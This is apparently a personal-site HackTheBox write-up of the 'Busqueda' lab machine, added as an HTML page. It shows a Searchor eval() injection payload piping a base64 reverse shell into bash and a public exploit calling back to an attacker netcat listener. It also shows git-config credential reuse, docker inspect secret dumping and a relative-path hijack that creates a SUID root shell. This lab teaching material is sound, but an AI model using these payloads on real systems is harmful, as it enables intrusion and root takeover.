@@ -1,0 +1,165 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <link rel="canonical" href="https://ribeir.in/writeups/htb/busqueda.html" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="icon" href="/favicon.ico" sizes="any">
+    <link rel="apple-touch-icon" href="/images/gaules_anao.jpeg">
+    <title>[HTB] Busqueda - ribeir.in</title>
+    <link rel="stylesheet" href="../../css/style.css">
+</head>
+<body>
+    <div class="container">
+        <div data-component="header" data-base-path="../../"></div>
+
+        <main>
+            <article class="content">
+                <a class="back-link" href="../hackthebox.html">← hackthebox</a>
+
+                <div class="article-head">
+                    <span class="badge badge-htb">HTB</span>
+                    <span class="diff diff-easy">easy</span>
+                    <span class="article-cat">· linux / web</span>
+                </div>
+
+                <h1>Busqueda</h1>
+
+                <div class="info-grid">
+                    <div class="info-cell"><span class="info-label">platform</span><span class="info-val">HackTheBox</span></div>
+                    <div class="info-cell"><span class="info-label">machine</span><span class="info-val">Busqueda</span></div>
+                    <div class="info-cell"><span class="info-label">category</span><span class="info-val">Web</span></div>
+                    <div class="info-cell"><span class="info-label">os</span><span class="info-val">Linux</span></div>
+                </div>
+
+                <div class="tags">
+                    <span class="tag">searchor 2.4.0 code injection (ghsa-66m2-493m-crh2)</span>
+                    <span class="tag">.git/config credential leak + reuse</span>
+                    <span class="tag">sudo docker inspect --format template injection</span>
+                    <span class="tag">full-checkup.sh relative-path hijack</span>
+                </div>
+
+                <img src="../../images/hackthebox/busqueda/index.png" alt="Busqueda Machine" style="max-width: 100%; margin-bottom: 20px;">
+
+
+                <h2>Recon</h2>
+
+                <p>Starting with <code>nmap</code>. Only two ports are open: SSH on 22 and Apache on 80. The web server does not serve on the IP directly, it redirects to the virtual host <strong>searcher.htb</strong>, so that name goes into <code>/etc/hosts</code>.</p>
+
+                <pre><code>[busqueda] nmap -Pn -v -T5 --min-rate 2000 -oN nmap -sSVC -p- 10.129.69.63
+Nmap scan report for 10.129.69.63
+Host is up (0.14s latency).
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
+80/tcp open  http    Apache httpd 2.4.52
+|_http-title: Did not follow redirect to http://searcher.htb/
+Service Info: Host: searcher.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel</code></pre>
+
+                <pre><code>[busqueda] echo '10.129.69.63 searcher.htb' | sudo tee -a /etc/hosts</code></pre>
+
+                <p>The site is <strong>Searcher</strong>, a small Flask app that builds search-engine URLs from a query. The footer credits the <strong>Searchor</strong> library and pins the version at <strong>2.4.0</strong>, which is the whole game.</p>
+
+                <h2>Exploitation</h2>
+
+                <p>Searchor 2.4.0 has an arbitrary code execution flaw (<a href="https://github.com/advisories/GHSA-66m2-493m-crh2">GHSA-66m2-493m-crh2</a>): the search routine hands the user-supplied query to Python's <code>eval()</code>, so a query that closes the intended call and appends <code>,__import__('os').system(...)</code> runs shell commands on the server. The <code>/search</code> endpoint of the Searcher app feeds the <code>query</code> parameter straight into that sink:</p>
+
+                <pre><code>engine=Google&amp;query=',__import__('os').system('BASE64_REVSHELL|base64 -d|bash')) #</code></pre>
+
+                <p>I used nikn0laty's <a href="https://github.com/nikn0laty/Exploit-for-Searchor-2.4.0-Arbitrary-CMD-Injection/blob/main/exploit.sh">Searchor 2.4.0 PoC</a>, which base64-encodes a <code>bash</code> reverse shell into that payload and POSTs it to <code>/search</code>:</p>
+
+                <pre><code>[busqueda] ./exploit.sh http://searcher.htb 10.10.15.208 4444
+---[Reverse Shell Exploit for Searchor &lt;= 2.4.2 (2.4.0)]---
+[*] Input target is http://searcher.htb
+[*] Input attacker is 10.10.15.208:4444
+[*] Run the Reverse Shell... Press Ctrl+C after successful connection</code></pre>
+
+                <pre><code>[busqueda] nc -lnvp 4444
+Listening on 0.0.0.0 4444
+Connection received on 10.129.69.63 55444
+svc@busqueda:/var/www/app$ id
+uid=1000(svc) gid=1000(svc) groups=1000(svc)</code></pre>
+
+                <p>That is a foothold as <code>svc</code>, the account running the app, and the user flag is in its home directory.</p>
+
+                <h2>Privilege Escalation</h2>
+
+                <h3>Credentials from the git config</h3>
+
+                <p>The app lives in a git working tree, and <code>/etc/hosts</code> shows a second virtual host, <code>gitea.searcher.htb</code>, backed by a Gitea container. The remote URL in <code>/var/www/app/.git/config</code> carries a set of embedded credentials:</p>
+
+                <pre><code>svc@busqueda:/var/www/app$ cat .git/config
+...
+[remote "origin"]
+    url = http://cody:jh1usoih2bkjaspwe92@gitea.searcher.htb/cody/Searcher_site.git</code></pre>
+
+                <p>The password <code>jh1usoih2bkjaspwe92</code> belongs to <code>cody</code> in Gitea, but it is also reused for the <code>svc</code> system account, which unlocks <code>sudo</code>:</p>
+
+                <pre><code>svc@busqueda:~$ sudo -l
+[sudo] password for svc:
+User svc may run the following commands on busqueda:
+    (root) /usr/bin/python3 /opt/scripts/system-checkup.py *</code></pre>
+
+                <h3>Reading the script through docker inspect</h3>
+
+                <p><code>system-checkup.py</code> exposes three actions: <code>docker-ps</code>, <code>docker-inspect</code>, and <code>full-checkup</code>. The <code>docker-inspect</code> action passes a user-controlled value straight into <code>docker inspect --format</code>, so any Go template works as a read primitive over the containers, including their environment. Dumping the Gitea container's env leaks the database and admin password:</p>
+
+                <pre><code>svc@busqueda:/opt/scripts$ sudo python3 /opt/scripts/system-checkup.py docker-ps
+CONTAINER ID   IMAGE                COMMAND                  ...   NAMES
+960873171e2e   gitea/gitea:latest   "/usr/bin/entrypoint…"   ...   gitea
+f84a6b33fb5a   mysql:8              "docker-entrypoint.s…"   ...   mysql_db
+
+svc@busqueda:/opt/scripts$ sudo python3 /opt/scripts/system-checkup.py docker-inspect '{{json .Config.Env}}' 960873171e2e
+["USER_UID=115","USER_GID=121","GITEA__database__DB_TYPE=mysql","GITEA__database__HOST=db:3306",
+ "GITEA__database__NAME=gitea","GITEA__database__USER=gitea","GITEA__database__PASSWD=yuiu1hoiu4i5ho1uh",
+ "PATH=...","USER=git","GITEA_CUSTOM=/data/gitea"]</code></pre>
+
+                <p>That password, <code>yuiu1hoiu4i5ho1uh</code>, logs into Gitea as <strong>administrator</strong>, where the private <code>scripts</code> repo holds the source of <code>/opt/scripts</code>. </p>
+
+                <img src="../../images/hackthebox/busqueda/gitea_1.png" alt="Gitea admin repos - Busqueda Machine" style="max-width: 100%; margin-bottom: 20px;">
+                <img src="../../images/hackthebox/busqueda/gitea_2.png" alt="Gitea scripts repo - Busqueda Machine" style="max-width: 100%; margin-bottom: 20px;">
+
+                
+                <p>Reading it shows exactly how <code>full-checkup</code> is invoked, and the bug: the helper script is run by a <strong>relative path</strong>.</p>
+
+                <pre><code>elif action == 'full-checkup':
+    try:
+        arg_list = ['./full-checkup.sh']     # relative path, run as root
+        print(run_command(arg_list))
+        print('[+] Done!')</code></pre>
+
+                <h3>Relative-path hijack for root</h3>
+
+                <p><code>subprocess.run(['./full-checkup.sh'])</code> resolves the script against the <em>current working directory</em>, not an absolute path. Since <code>svc</code> is allowed to run the whole thing as root, I just <code>cd</code> into a writable directory, drop my own <code>full-checkup.sh</code> there, and run the sudo command from it. The malicious script makes a SUID copy of <code>bash</code>:</p>
+
+                <pre><code>svc@busqueda:~$ cd /tmp
+svc@busqueda:/tmp$ cat &gt; full-checkup.sh &lt;&lt;'EOF'
+#!/bin/bash
+cp /bin/bash /tmp/rootbash
+chmod 4755 /tmp/rootbash
+EOF
+svc@busqueda:/tmp$ chmod +x full-checkup.sh
+svc@busqueda:/tmp$ sudo python3 /opt/scripts/system-checkup.py full-checkup
+
+[+] Done!
+svc@busqueda:/tmp$ /tmp/rootbash -p
+rootbash-5.1# id
+uid=1000(svc) gid=1000(svc) euid=0(root) groups=1000(svc)</code></pre>
+
+                <p>The root-owned SUID <code>rootbash</code> keeps its privileges with <code>-p</code>, giving <code>euid=0</code> and a read of <code>/root/root.txt</code>.</p>
+
+                <div class="article-eof">
+                    <div class="eof-line">─────────────────────────────────────</div>
+                    <div class="eof-title">HackTheBox // Busqueda</div>
+                    <div class="eof-author">ribeir.in</div>
+                    <div class="eof-line">─────────────────────────────────────</div>
+                </div>
+            </article>
+
+        </main>
+
+        <div data-component="footer" data-base-path="../../"></div>
+    </div>
+
+    <script src="../../js/main.js"></script>
+</body>
+</html>
